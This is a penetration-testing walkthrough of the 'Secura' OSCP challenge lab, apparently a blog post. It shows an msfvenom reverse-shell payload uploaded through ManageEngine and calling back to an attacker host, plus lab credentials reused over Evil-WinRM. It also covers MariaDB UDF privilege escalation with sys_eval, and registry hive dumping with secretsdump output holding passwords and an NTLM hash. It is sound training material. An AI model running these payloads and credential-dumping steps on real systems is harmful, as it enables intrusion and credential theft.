---
title: Secura — Challenge Lab Writeup
date: 2026-10-18 20:30:00 +0800
categories: [OSCP, Challenges]
tags: [oscp, secura, active-directory, privilege-escalation, mariadb, udf, adscan, secretsdump]
description: >-
  Full walkthrough of the Secura (Challenge Lab 0) Active Directory environment —
  ManageEngine RCE, RDCMan credential theft, MariaDB UDF privilege escalation,
  credential dumping, and domain enumeration.
render_with_liquid: false
---

## 1.0 Scope & Objectives

This is a walkthrough of the **Secura** Active Directory lab. It is an *assumed breach* test — we are given one low-privileged domain account to start with, and our job is to work our way up to **full control of the Domain Controller** (Domain Admin).

| Item                    | Value                                  |
| ----------------------- | -------------------------------------- |
| Network range           | `192.168.216.0/24`                     |
| VM1 — Domain Controller | `192.168.216.97`                       |
| VM2 — workstation       | `192.168.216.96`                       |
| VM3 — workstation       | `192.168.216.95`                       |
| Starting account        | `Eric.Wallows` / `EricLikesRunning800` |

---

## 2.0 Attack Overview

The whole attack chains together a few separate weaknesses, one after another:

1. **Get a foothold.** A ManageEngine Applications Manager 14 web app runs on `192.168.216.95:8443`. It uses default credentials and has a file-upload feature that runs whatever you upload. We use it to get code execution as `SYSTEM` (CVE-2020-14008).
2. **Steal credentials.** The same machine holds RDCMan config files with passwords saved in plain text. We read them.
3. **Move sideways.** Those passwords let us log into the next machine (ERA).
4. **Escalate privileges.** On ERA, a MariaDB service runs as Administrator and its binary is writable. We abuse the MariaDB UDF feature to become Administrator.
5. **Own the domain.** The final step is full control of the Domain Controller.

---

## 3.0 Reconnaissance — Initial Network Enumeration

We ran a full TCP port scan with version detection against all three machines (total time 5m 32s). The full output is in the screenshots below; here is a short summary.

### 3.1 VM3 (192.168.216.95) — ManageEngine Application Server

This box has the usual Windows services open — SMB (135/139/445), RDP (3389) and WinRM (5985/5986). The interesting one is **HTTPS on port 8443**, which the scan identified as **ManageEngine Applications Manager**. There is also a Java RMI listener on port 49699.

### 3.2 VM2 (192.168.216.96) — MariaDB Database Host

This Windows box has SMB (135/139/445) and WinRM (5985/5986), plus a **MariaDB 10.3.24** database on port 3306.

### 3.3 VM1 (192.168.216.97) — Domain Controller

This is the **Domain Controller** for the `secura.yzx` domain, running Windows Server 2016 Standard. It runs the full set of Active Directory services: DNS (53), Kerberos (88), LDAP/LDAPS (389/636), SMB (445), kpasswd5 (464), Global Catalog (3268/3269) and ADWS (9389).

### 3.4 Evidence — Full Scan Output

![](/assets/img/posts/secura/recon-1.png)
![](/assets/img/posts/secura/recon-2.png)
![](/assets/img/posts/secura/recon-3.png)

---

## 4.0 Enumeration — ManageEngine Applications Manager

### 4.1 Default Administrative Credentials

Opening `https://192.168.216.95:8443` shows the ManageEngine Applications Manager 14 login page. It still uses the **default credentials `admin:admin`** — nobody ever changed them.

![](/assets/img/posts/secura/manageengine-login.png)

### 4.2 Unrestricted File Upload (CVE-2020-14008)

Once logged in, we found a **file upload** feature. It accepts **any file type**, and it saves files into `C:\Program Files\ManageEngine\AppManager14\working\`. Anything placed in that folder gets **run by the server** — so uploading a payload there is a straight path to code execution. This is **CVE-2020-14008**, an unrestricted file-upload / RCE bug in ManageEngine.

![](/assets/img/posts/secura/manageengine-upload.png)

![](/assets/img/posts/secura/manageengine-enum.png)

![](/assets/img/posts/secura/manageengine-rce.png)

---

## 5.0 Exploitation — Initial Foothold on VM3

### 5.1 Remote Code Execution via File Upload

We built a Windows x64 reverse-shell payload with `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.249 LPORT=1234 -f exe -o 1.exe
```

![](/assets/img/posts/secura/msfvenom.png)

Then a small `run.bat` to launch it:

```bat
start "" "C:\Program Files\ManageEngine\AppManager14\working\1.exe"
```

![](/assets/img/posts/secura/run-bat.png)

We uploaded both files through the ManageEngine upload feature and triggered `run.bat`. On our side we started a Netcat listener:

```bash
nc -lvnp 1234
```

![](/assets/img/posts/secura/nc-listener.png)

The connection came back and gave us a shell on `192.168.216.95` running as **`NT AUTHORITY\SYSTEM`** — full local admin on VM3, no extra privesc needed.

### 5.2 Post-Exploitation Enumeration with Evil-WinRM & WinPEAS

For a stable, interactive shell, we logged in with Evil-WinRM using the given domain account:

```powershell
evil-winrm -i 192.168.216.95 -u Eric.Wallows -p 'EricLikesRunning800'
```

We grabbed WinPEAS (from the PEASS-ng project):

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O /home/kali/tools/winPEASx64.exe
```

Then uploaded and ran it in `windowscreds` mode (credential checks only, `quiet` hides the banner):

```powershell
upload /home/kali/tools/winPEASx64.exe
./winpeasx64.exe windowscreds quiet > winpeas.txt
download winpeas.txt
```

![](/assets/img/posts/secura/winpeas-upload.png)

![](/assets/img/posts/secura/winpeas-download.jpg)

WinPEAS pointed us to a few useful things:

- **RDCMan settings file** — `C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings`. RDCMan saves RDP connection passwords, so this file is a lead.
- **A saved RDP connection** to `era.secura.local` (Administrator, SID `500`).
- **DPAPI files** — encrypted credential blobs under the Administrator profile.

---

## 6.0 Lateral Movement & Pivoting

### 6.1 RDCMan Stored Credentials (lead)

WinPEAS found an RDCMan settings file. RDCMan stores RDP connection credentials, so we opened the file:

![](/assets/img/posts/secura/winpeas-rdcman.png)

Inside was a password stored in **plain text**:

| Field    | Value         |
| -------- | ------------- |
| Username | `apache`      |
| Password | `New2Era4.!`  |
| Domain   | `SECURE`      |

The saved connection points to `era.secura.yzx` — the next machine. RDCMan keeps these passwords in cleartext, so anyone with local admin on the host can read them.

Excerpt from `RDCMan.settings`:

```xml
<credentialsProfile inherit="None">
  <profileName scope="Local">SECURE\apache</profileName>
  <userName>apache</userName>
  <password>New2Era4.!</password>
  <domain>SECURE</domain>
</credentialsProfile>
<server>Connect To\era.secura.yzx</server>
```

### 6.2 Lateral Movement — the `apache` credential

We used the `apache` password to log into `192.168.216.96` (hostname `era`) over WinRM:

```bash
evil-winrm -i 192.168.216.96 -u apache -p 'New2Era4.!'
```

We got a shell as the local user **`era\apache`** — a low-privileged local account.

![](/assets/img/posts/secura/apache-shell.jpg)

---

## 7.0 Privilege Escalation on ERA — MariaDB UDF

### 7.1 Enumeration with PrivescCheck

Now we are `era\apache` — a low-privileged user — so the goal is to find a way to run code as a higher-privileged account. We used two enumerators: **WinPEAS** (broad) and **PrivescCheck** (itm4n, cleaner output):

```powershell
upload /home/kali/tools/PrivescCheck.ps1
Get-Content .\PrivescCheck.ps1 -Raw | Invoke-Expression; Invoke-PrivescCheck -Extended
```

*(PrivescCheck comes from its release page — `https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1` — and we dot-load it via `Invoke-Expression` to get around the PowerShell execution policy.)*

The biggest finding was in the `Services - Image File Permissions` check, explained next.

### 7.2 The Finding — MySQL Service Runs as Administrator

**Concept.** A Windows service is a background program that runs on its own, and each service runs *as* a specific account (SYSTEM, a local admin, and so on). If a service runs as a privileged account **and** a low-privileged user can edit its executable, that user can swap the executable for their own and let the service run it as the privileged account. That is the classic *writable-service-binary* privesc.

**Analogy.** Think of a Windows service as a courier with a permanent *all-access pass* to the Administrator-only area — the pass belongs to the courier, not the parcel. Every day the courier carries a fixed parcel (the service's own executable, `mysqld.exe`). If we swap that parcel for our own (because the executable is left writable), the courier will still walk through the Administrator-only door and deliver *our* parcel — because the pass doesn't care what's inside, only who's carrying it.

PrivescCheck flagged two service binaries as **writable by `NT AUTHORITY\Authenticated Users`** (a group that includes every logged-in user, including `apache`):

| Service        | Image Path                      | Runs As           | Useful?                    |
| -------------- | ------------------------------- | ----------------- | -------------------------- |
| `ApacheServer` | `C:\xampp\apache\bin\httpd.exe` | `.\apache`        | No — already our own user  |
| `MySQL`        | `C:\xampp\mysql\bin\mysqld.exe` | `.\Administrator` | **Yes** — higher privilege |

The `ApacheServer` service is useless to us — it already runs as `apache`, so swapping its binary changes nothing. The **`MySQL`** service is the target: its binary `C:\xampp\mysql\bin\mysqld.exe` is writable by `Authenticated Users`, **and** the service runs as the **local `Administrator`** account. Swap that binary and let the service run it, and we get code execution as `Administrator`.

We tried the direct way first. Replacing the binary failed because the service was running, which locks its executable:

```powershell
copy .\mysqld.exe C:\xampp\mysql\bin\mysqld.exe
# The process cannot access the file ... because it is being used by another process.
```

To load a replaced binary, we would need to restart the service — but we couldn't:

- `net stop MySQL` → `System error 5` (the service ACL doesn't give `apache` permission to stop it).
- `shutdown /r /t 0` → `Access is denied` (a WinRM session can't reboot even with `SeShutdownPrivilege`).

So the "swap the binary" path was blocked. We used the database's own features instead — the MariaDB UDF trick.

### 7.3 The Pivot — MariaDB User-Defined Function (UDF)

**The idea in one sentence.** The `MySQL` service runs as `.\Administrator`, so the database process (`mysqld.exe`) already has Administrator power. A *User-Defined Function* (UDF) is how we borrow that power: it lets us teach the database a new SQL function that runs OS commands — and those commands run **as Administrator**, not as `apache`.

**What is a UDF, exactly?** A database only understands a fixed set of built-in commands (`SELECT`, `COUNT`, `LENGTH`, and so on). A UDF is a way to install a *plugin* — a compiled shared library (a `.dll` file on Windows) — that adds a brand-new function the database didn't have before. Once installed, you call it just like any built-in function. It's a documented, legitimate MariaDB feature: see [CREATE FUNCTION (UDF)](https://mariadb.com/docs/server/server-usage/user-defined-functions/create-function-udf) and the [User-Defined Functions overview](https://mariadb.com/docs/server/server-usage/user-defined-functions).

The library we want — `lib_mysqludf_sys` — adds a function called `sys_eval`. `sys_eval('whoami')` makes the database run the OS command `whoami` and hand back the output. Because the database is the `MySQL` service running as `.\Administrator`, that `whoami` runs as Administrator. The library and its full function list are documented at <https://github.com/mysqludf/lib_mysqludf_sys>.

**The plan, step by step.** Five things have to line up for this to work. Each one is checked below against this environment.

**Step 1 — Database admin access.** To install a UDF you need to run `CREATE FUNCTION`, which needs database admin. The local MariaDB accepted `root` with an **empty password** — the default that ships with XAMPP and was never changed. That gives us full database admin.

**Step 2 — The server must be allowed to write files.** Installing a UDF means dropping our `.dll` onto the target, so the database needs permission to write files. That's controlled by `@@secure_file_priv`:

- `secure_file_priv` set to a **path** → the server may only write inside that path.
- `secure_file_priv` set to **empty / NULL** → the server may write **anywhere** (no restriction).

**Step 3 — Find the plugin directory.** A UDF library only loads from one specific folder — the "plugin directory", reported by `@@plugin_dir`. Our `.dll` must land there.

**Step 4 — Get a UDF library that runs OS commands.** `lib_mysqludf_sys` (see "What is a UDF" above) gives us `sys_eval` (returns output) and `sys_exec` (returns exit code). We took it from the sqlmap distribution on our machine.

**Step 5 — Get the DLL into the plugin directory.** This is the fiddly part, with two snags:

- *The DLL is "cloaked".* sqlmap stores its UDF files **cloaked** — XOR-encrypted and zlib-compressed — so the file sitting in sqlmap's data folder is *not* a valid DLL (it has no `MZ` header). We have to "decloak" it first with sqlmap's own tool:

```bash
python3 /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll
```

The result was a valid 64-bit Windows DLL (`PE32+ ... x86-64`).

- *The plugin folder didn't exist yet.* `@@plugin_dir` said `C:\xampp\mysql\lib\plugin\`, but that folder wasn't actually on disk (MariaDB reports its default even before the folder is created). We created it first — and because `apache` created it, `apache` owns it and can copy straight into it:

```powershell
mkdir C:\xampp\mysql\lib\plugin
upload /home/kali/oscp/secura/lib_mysqludf_sys.dll
copy .\lib_mysqludf_sys.dll C:\xampp\mysql\lib\plugin\lib_mysqludf_sys.dll
```

**Step 6 — Register and use the function.** With the DLL in place, one SQL line installs it:

```powershell
C:\xampp\mysql\bin\mysql.exe -u root -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll';"
```

`CREATE FUNCTION ... SONAME` means: *"register a SQL function named `sys_eval`, returning a string, backed by the `sys_eval` symbol inside `lib_mysqludf_sys.dll`."* (The `SONAME` clause is the UDF form of `CREATE FUNCTION`; the exact grammar is in the MariaDB docs linked above.)

**Why this is escalation (recap).** The `whoami` that `sys_eval` runs executes *inside* `mysqld.exe`. That process is the `MySQL` service, which runs as `.\Administrator`. So while our own shell is only `apache`, anything the database runs for us runs as `Administrator` — confirmed in the next section.

**Further reading.**

- MariaDB — [CREATE FUNCTION (UDF)](https://mariadb.com/docs/server/server-usage/user-defined-functions/create-function-udf) and [User-Defined Functions](https://mariadb.com/docs/server/server-usage/user-defined-functions) (official reference).
- MariaDB — [User-Defined Functions Security](https://mariadb.com/docs/server/server-usage/user-defined-functions/user-defined-functions-security) (plugin-dir placement + required privileges).
- HackTricks — [MySQL / MariaDB Privilege Escalation (UDF)](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql/index.html).
- `lib_mysqludf_sys` — [project page / function reference](https://github.com/mysqludf/lib_mysqludf_sys).
- sqlmap — [UDF files and the `cloak.py` utility](https://github.com/sqlmapproject/sqlmap).
- MySQL UDF Exploitation cheat sheet — [koparmalbaris/MySQL-UDF-Exploitation](https://github.com/koparmalbaris/MySQL-UDF-Exploitation).
- HackIndex — [MySQL UDF Privilege Escalation](https://hackindex.io/services/mysql/exploitation/mysql-udf-privilege-escalation).

### 7.4 Executing Commands as Administrator

With the UDF registered, we just call `sys_eval` from SQL. The command runs inside `mysqld.exe` — the MySQL service — which runs as `.\Administrator`:

```powershell
C:\xampp\mysql\bin\mysql.exe -u root -e "SELECT sys_eval('whoami');"
```

```
sys_eval('whoami')
era\administrator
```

The output `era\administrator` proves that our commands now run as the local Administrator. That's **privilege escalation from `era\apache` to `era\Administrator`** on the ERA host.

---

## 8.0 Post-Exploitation & Domain Enumeration

### 8.1 Credential Dumping with secretsdump

With a reverse shell as `era\Administrator`, we pulled the local credential stores. We saved the `SAM`, `SYSTEM` and `SECURITY` registry hives and parsed them offline with impacket's `secretsdump.py`:

```powershell
reg save HKLM\SAM C:\Users\apache.ERA\Documents\sam.hiv
reg save HKLM\SYSTEM C:\Users\apache.ERA\Documents\system.hiv
reg save HKLM\SECURITY C:\Users\apache.ERA\Documents\security.hiv
```

```bash
impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL
```

Two useful things came out:

- **The Administrator password in cleartext** — `Almost4There8.?` — from the `_SC_MySQL` LSA secret. Because the `MySQL` service runs as `.\Administrator`, its service-account password is stored (reversibly) in LSA, and we can read it.
- **The local `Administrator` NTLM hash** — `faf613cedb73980bbd34e0a5514df813`.

Relevant `secretsdump.py` output:

```
[*] Dumping LSA Secrets
[*] _SC_ApacheServer
(Unknown User):New2Era4.!
[*] _SC_cloudbase-init
(Unknown User):IRoDjQ8JghcHUlQCX4UK
[*] _SC_MySQL
(Unknown User):Almost4There8.?
```

There were no cached domain logon credentials on ERA.

### 8.2 Domain Enumeration with adscan

We enumerated the `secura.yzx` domain against the Domain Controller (`dc01.secura.yzx`) using `adscan` with the starting account `Eric.Wallows`:

```bash
adscan scan --domain secura.yzx --dc-ip 192.168.216.97 --username Eric.Wallows --password 'EricLikesRunning800' --mode full -o reports/
```

Key findings:

- **Zerologon (CVE-2020-1472)** — possible exposure on `DC01` (Windows Server 2016 Standard).
- **`Admin` is a member of `Administrators`** — a nested path to `Domain Admins`, useful if we can get that account's credentials.
- **Group Policy Preferences (cpassword)** in SYSVOL — a possible lead for cleartext credentials.
- **SMB/LDAP signing disabled** and **`MachineAccountQuota = 10`** (an RBCD prerequisite). No AD CS.

---

## 9.0 Domain Compromise

> _(pending — Domain Controller)_

---

## 10.0 Flags

- **local.txt:**
- **proof.txt:**
